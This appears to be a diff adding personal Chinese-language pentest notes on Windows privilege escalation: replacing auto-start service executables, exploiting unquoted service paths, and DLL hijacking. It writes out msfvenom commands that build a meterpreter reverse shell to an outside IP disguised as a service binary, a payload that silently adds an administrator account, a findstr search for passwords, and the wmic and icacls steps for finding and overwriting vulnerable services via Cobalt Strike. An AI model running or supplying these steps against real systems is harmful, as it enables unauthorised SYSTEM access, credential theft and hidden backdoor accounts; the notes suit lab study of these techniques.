@@ -1,0 +1,120 @@
+服务的权限一般是临时的。
+
+win10及以上系统：权限排名
+TrustedInstaller（最高权限，可修改系统文件） >system > administrator > user > 其他
+
+findstr /si password *.txt	//在当前目录下寻找所有以.txt结尾后缀的文件，且其中包含password关键字的txt文件。
+
+chdir	查看当前路径
+
+type	相当于linux的cat
+
+提权：
+通过cs的各种插件、exp等，灵活使用，来提权。
+若在Administrators组，则常尝试bypassuac提权。
+
+
+win全版本提权EXP**(CVE-2020-0787)**
+服务一般需要重启才会生效。或一般需要有权限重启的用户重启之后才会生效。
+
+1.查找为自启动的进程或服务；
+2.明确我们具有写权限；
+3.替换它。 成功提权。
+
+
+提权方式一：若对方服务或进程配置错误，且该进程或服务(也就是exe文件)为高权限运行，且我们对该目录有写权限。
+eg1: 首先安装photodex proshow的包含漏洞的应用程序。
+第一步：
+# msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.43.103 lport=1236 prependmigrate=true       prependmigrateprocess=explorer.exe -f exe >   scsiaccess.exe 或详细点：
+# msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.43.103 lport=1236 prependmigrate=true       prependmigrateprocess=explorer.exe  --platform windows -a x64   -f exe  -o   scsiaccess.exe 或
+或者直接添加用户：msfvenom -p windows/exec CMD='net user zxczxp /add & net localgroup administrators zxczxp /add' -f exe > /root/Desktop/scsiaccess.exe 
+通过这种方式替换掉服务进程，执行添加管理员的命令更稳。
+
+注：名称scsiaccess.exe一般需一样，因为要替换对方的进程。
+
+第二步：
+通过cs或msf的会话执行cmd命令：
+# 查询自启动服务且带有配置错误的服务
+wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """ 
+如输出：
+ScsiAccess                                                      ScsiAccess                                C:\Program Files (x86)\Photodex\ProShow Producer\ScsiAccess.exe                    Auto 
+则去查看C:\Program Files (x86)\Photodex\ProShow Producer\ScsiAccess.exe该文件我们是否有替换的权限。
+执行命令：
+icacls "C:\Program Files (x86)\Photodex\ProShow Producer"
+若在cs_beacon中执行，则需注意以下：
+beacon > shell icacls "C:\Program Files (x86)\Photodex\ProShow Producer"	//如此运行
+
+发现Everyone:(CI)(F)，即everyone都有FULL权限。则：
+
+第三步：
+move a.txt b.txt	//重命名。
+利用cs上传该文件，覆盖即可。 若该进程正在运行，则直接替换会失败。则可先对原进程重命名，再上传我们的文件。
+成功。
+move "C:\Program Files (x86)\Photodex\ProShow Producer\scsiaccess.exe"   "C:\Program Files (x86)\Photodex\ProShow Producer\qzz8.exe" 
+
+成功获取session，还是NT权限(系统权限)。
+
+
+cs服务马不太稳定，推荐msf，因为设置的木马还会自动迁移。
+
+eg2：cs生成服务器马(如，不分阶段的exe)。命名为scsiaccess.exe，即要和目标的service同名，覆盖。
+上线成功。
+
+
+eg3：未引用服务路径提权。利用windows对空格解释出错。  该方式一般是通过管理员提升到系统权限常使用。
+若无双引号，windows读取路径被空格截断，进而读取前半部分的如exe文件。
+C:\Program Files (x86)\Photodex\ProShow Producer\scsiaccess.exe 则匹配C:\Program.exe文件。
+核心：还是利用服务、exe提权的方式。
+第一步：明确存在未引用服务路径
+#cmd
+wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """ 
+如安装存在漏洞的IObit Advanced.exe程序。
+注：选择的payload是服务、exe类型的。
+
+首先要确定是我们具有写入权限的目录：
+执行命令检测目录的权限：如：icacls "C:"		//查看c盘的权限
+执行：
+beacon> shell wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
+发现：
+C:\Program Files (x86)\Photodex\ProShow Producer\ScsiAccess.exe 
+故生成服务类型的exe，命名为ProShow.exe   利用ProShow Producer中的空格。
+
+上传到C:\Program Files (x86)\Photodex\路径下。
+
+
+
+DLL劫持：是微软在windows下实现共享[函数库]概念的一种方式。
+即微软将常用的底层函数封装在dll文件中，要调用这些函数时，直接调用dll文件。
+劫持：即替换目标dll文件。
+
+dll劫持利用条件：
+1.在存放恶意dll的文件夹上需要有写入权限
+2.目标缺少DLL
+3.加载恶意dll之后应用必须正常运行
+4.以高权限运行
+
+使用微软提供的进程监视软件：procmon.exe
+通过Process Monitor明确状态是Name NOT FOUND的dll.
+过滤一下。
+在靶机上收集信息pid等后，下载靶机对应的软件在本地尝试劫持，实验是否成功。
+
+生成(尽量选x86的).dll文件。同名。
+如cs选择不分阶段，生成dll文件。
+注：
+1.一般生成x86的dll文件。
+2.需要与要劫持的dll文件同名。 为了替换或添加，运行。
+
+上传dll文件到靶机。
+
+核心：优先考虑将dll文件放在该应用程序的安全目录下。
+若该应用程序以管理员权限加载该dll文件，则返回管理员权限的session；
+若是普通权限运行，则返回普通权限的session。
+
+
+可能出现的问题：
+1.元应用程序加载恶意dll文件，没法正常运行，故失败。
+A：换其他的dll文件劫持。
+换了几次后，终于上线成功。
+2.不足：该应用程序已关闭，session一般就会丢失，故应尽快迁移。
+
+
